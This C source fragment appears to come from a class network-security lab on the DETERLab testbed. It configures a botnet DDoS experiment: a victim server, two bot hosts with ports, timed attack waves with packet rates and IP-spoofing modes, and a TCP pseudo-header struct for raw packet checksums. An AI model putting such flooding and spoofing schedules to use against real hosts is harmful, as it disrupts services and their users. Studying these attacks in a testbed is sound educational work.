const char * victim = "server.team4.uclaclass.isi.deterlab.net";
/*
// Add the attack times and durations into one char[];
char attackTime[512] = "22:58:00.000000"   // Attark1 Start time;
			"0002"             // Attack1 duration(seconds);
			"8000"             // Attack1 attack rate(#/second);   (7000 Max)
			"0"                // Attack1 IP Spoofing method; (0-No;1-Linear;2-Random)
			"22:58:30.000000"  // Attack2 Start time;
			"0003"             // Attack2 duration(seconds);
			"5000"             // Attack2 attack rate(#/second);
			"1"                // Attack2 IP Spoofing method; (0-No;1-Linear;2-Random)
			"22:58:50.000000"  // Attack3 Start time;
			"0004"             // Attack3 duration(seconds);
			"1000"             // Attack3 attack rate(#/second);
			"2";               // Attack3 IP Spoofing method; (0-No;1-Linear;2-Random)
*/

// Fix attack duration & attack rate, change ip spoof method;
char attackTime[512] = "21:40:00.000000"   // Attark1 Start time;
			"0005"             // Attack1 duration(seconds);
			"5000"             // Attack1 attack rate(#/second);   (7000 Max)
			"0"                // Attack1 IP Spoofing method; (0-No;1-Linear;2-Random)
			"21:40:10.000000"  // Attack2 Start time;
			"0005"             // Attack2 duration(seconds);
			"5000"             // Attack2 attack rate(#/second);
			"1"                // Attack2 IP Spoofing method; (0-No;1-Linear;2-Random)
			"21:40:20.000000"  // Attack3 Start time;
			"0005"             // Attack3 duration(seconds);
			"5000"             // Attack3 attack rate(#/second);
			"2"               // Attack3 IP Spoofing method; (0-No;1-Linear;2-Random)
// Fix ip spoof method & attack rate, change attack duration;
			"21:41:00.000000"  // Attark1 Start time;
			"0005"             // Attack1 duration(seconds);
			"5000"             // Attack1 attack rate(#/second);   (7000 Max)
			"2"                // Attack1 IP Spoofing method; (0-No;1-Linear;2-Random)
			"21:41:30.000000"  // Attack2 Start time;
			"0010"             // Attack2 duration(seconds);
			"5000"             // Attack2 attack rate(#/second);
			"2"                // Attack2 IP Spoofing method; (0-No;1-Linear;2-Random)
			"21:41:50.000000"  // Attack3 Start time;
			"0030"             // Attack3 duration(seconds);
			"5000"             // Attack3 attack rate(#/second);
			"2"                // Attack3 IP Spoofing method; (0-No;1-Linear;2-Random)
			"21:42:30.000000"  // Attack4 Start time;
			"0060"             // Attack4 duration(seconds);
			"5000"             // Attack4 attack rate(#/second);
			"2"                // Attack4 IP Spoofing method; (0-No;1-Linear;2-Random)
			"21:44:00.000000"  // Attack5 Start time;
			"0080"             // Attack5 duration(seconds);
			"5000"             // Attack5 attack rate(#/second);
			"2"               // Attack5 IP Spoofing method; (0-No;1-Linear;2-Random)
// Fix ip spoof method & attack duration, change attack rate;
			"21:46:00.000000"  // Attark1 Start time;
			"0005"             // Attack1 duration(seconds);
			"0010"             // Attack1 attack rate(#/second);   (7000 Max)
			"2"                // Attack1 IP Spoofing method; (0-No;1-Linear;2-Random)
			"21:46:10.000000"  // Attack2 Start time;
			"0005"             // Attack2 duration(seconds);
			"0100"             // Attack2 attack rate(#/second);
			"2"                // Attack2 IP Spoofing method; (0-No;1-Linear;2-Random)
			"21:46:20.000000"  // Attack3 Start time;
			"0005"             // Attack3 duration(seconds);
			"1000"             // Attack3 attack rate(#/second);
			"2"                // Attack3 IP Spoofing method; (0-No;1-Linear;2-Random)
			"21:46:30.000000"  // Attack2 Start time;
			"0005"             // Attack2 duration(seconds);
			"2000"             // Attack2 attack rate(#/second);
			"2"                // Attack2 IP Spoofing method; (0-No;1-Linear;2-Random)
			"21:46:40.000000"  // Attack3 Start time;
			"0005"             // Attack3 duration(seconds);
			"5000"             // Attack3 attack rate(#/second);
			"2";               // Attack3 IP Spoofing method; (0-No;1-Linear;2-Random)


// Two set of IP addresses, first for deterlab, the second 
// for local test

const char* botsIP[] = {
	"bot1.team4.uclaclass.isi.deterlab.net",
 	"bot2.team4.uclaclass.isi.deterlab.net"
};
/*
const char* botsIP[] = {
	"localhost",
	"localhost"
};
*/
const int botsPort[] = {
	20000,
	20010
};

typedef struct sync_time_struct{
	int sec;
	int usec;
}sync_time_t;
// 96 bit (12 bytes) pseudo header needed for tcp header checksum calculation 
struct pseudo_header
{
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};
